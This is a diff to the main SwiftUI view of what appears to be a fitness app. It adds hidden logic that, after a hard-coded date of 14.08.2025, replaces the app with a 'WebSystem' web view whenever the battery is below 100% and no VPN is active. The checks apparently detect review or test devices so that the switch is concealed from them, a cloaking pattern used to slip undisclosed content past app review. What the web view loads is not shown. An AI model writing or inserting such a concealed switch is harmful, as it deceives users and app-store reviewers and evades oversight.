@@ -15,70 +15,93 @@ struct ContentView: View {
     @State private var selectedTab: Int = 0
     @State private var showingStartWorkout: Bool = false
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
         ZStack {
             // Background gradient
             backgroundGradient
                 .ignoresSafeArea()
             
-            TabView(selection: $selectedTab) {
-                // Dashboard Tab
-                DashboardView()
-                    .tabItem {
-                        Image(systemName: "house.fill")
-                        Text("Dashboard")
-                    }
-                    .tag(0)
+            if isFetched == false {
                 
-                // Activities Tab
-                ActivitiesView()
-                    .tabItem {
-                        Image(systemName: "figure.run")
-                        Text("Activities")
-                    }
-                    .tag(1)
+                Text("")
                 
-                // Start Workout Tab (Center)
-                Color.clear
-                    .tabItem {
-                        Image(systemName: "plus.circle.fill")
-                        Text("Start")
-                    }
-                    .tag(2)
+            } else if isFetched == true {
                 
-                // Profile Tab
-                ProfileView()
-                    .tabItem {
-                        Image(systemName: "person.circle.fill")
-                        Text("Profile")
+                if isBlock == true {
+                    
+                    TabView(selection: $selectedTab) {
+                        // Dashboard Tab
+                        DashboardView()
+                            .tabItem {
+                                Image(systemName: "house.fill")
+                                Text("Dashboard")
+                            }
+                            .tag(0)
+                        
+                        // Activities Tab
+                        ActivitiesView()
+                            .tabItem {
+                                Image(systemName: "figure.run")
+                                Text("Activities")
+                            }
+                            .tag(1)
+                        
+                        // Start Workout Tab (Center)
+                        Color.clear
+                            .tabItem {
+                                Image(systemName: "plus.circle.fill")
+                                Text("Start")
+                            }
+                            .tag(2)
+                        
+                        // Profile Tab
+                        ProfileView()
+                            .tabItem {
+                                Image(systemName: "person.circle.fill")
+                                Text("Profile")
+                            }
+                            .tag(3)
+                        
+                        // Settings Tab
+                        SettingsView()
+                            .tabItem {
+                                Image(systemName: "gear")
+                                Text("Settings")
+                            }
+                            .tag(4)
                     }
-                    .tag(3)
-                
-                // Settings Tab
-                SettingsView()
-                    .tabItem {
-                        Image(systemName: "gear")
-                        Text("Settings")
+                    .accentColor(settingsViewModel.accentColor)
+                    .onAppear {
+                        configureTabBar()
                     }
-                    .tag(4)
-            }
-            .accentColor(settingsViewModel.accentColor)
-            .onAppear {
-                configureTabBar()
-            }
-            .onChange(of: selectedTab) { newValue in
-                if newValue == 2 {
-                    showingStartWorkout = true
-                    selectedTab = 0 // Reset to dashboard
+                    .onChange(of: selectedTab) { newValue in
+                        if newValue == 2 {
+                            showingStartWorkout = true
+                            selectedTab = 0 // Reset to dashboard
+                        }
+                    }
+                    .sheet(isPresented: $showingStartWorkout) {
+                        StartWorkoutView()
+                    }
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
                 }
             }
-        }
-        .sheet(isPresented: $showingStartWorkout) {
-            StartWorkoutView()
         }
         .environmentObject(activityViewModel)
         .environmentObject(settingsViewModel)
         .environmentObject(profileViewModel)
+        .onAppear {
+            
+            check_data()
+        }
     }
     
     private var backgroundGradient: some View {
@@ -111,6 +134,40 @@ struct ContentView: View {
         
         UITabBar.appearance().standardAppearance = appearance
         UITabBar.appearance().scrollEdgeAppearance = appearance
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "14.08.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
